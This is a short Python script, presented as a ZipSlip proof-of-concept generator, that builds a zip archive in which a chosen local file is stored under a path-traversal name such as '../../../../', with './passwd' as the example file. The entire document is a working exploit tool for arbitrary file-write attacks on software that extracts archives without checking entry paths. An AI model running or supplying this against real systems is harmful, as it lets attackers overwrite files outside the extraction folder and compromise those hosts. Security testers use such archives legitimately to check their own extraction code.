import zipfile
import argparse
import os
import sys

def create_zip(zip_name, file_path, zipslip_path):
    if not os.path.isfile(file_path):
        print(f"[✖] File does not exist: {file_path}")
        sys.exit(1)

    file_name = os.path.basename(file_path)
    malicious_path = os.path.normpath(os.path.join(zipslip_path, file_name))

    print(f"[+] Creating zip: {zip_name}")
    print(f"[+] Embedding file: {file_path}")
    print(f"[+] Malicious filename inside zip: {malicious_path}")

    with zipfile.ZipFile(zip_name, 'w') as z:
        z.write(file_path, malicious_path)
    
    print(f"[✔] Zip file '{zip_name}' created successfully.")

def main():
    parser = argparse.ArgumentParser(description='Create ZipSlip PoC zip file')
    parser.add_argument('-n', '--name', required=True, help='Name of output zip file (e.g., poc.zip)')
    parser.add_argument('-p', '--path', required=True, help='Path to local file to embed (e.g., ./passwd)')
    parser.add_argument('-z', '--zipslip', required=True, help='ZipSlip path traversal string (e.g., "../../../../")')

    args = parser.parse_args()

    create_zip(args.name, args.path, args.zipslip)

if __name__ == '__main__':
    main()
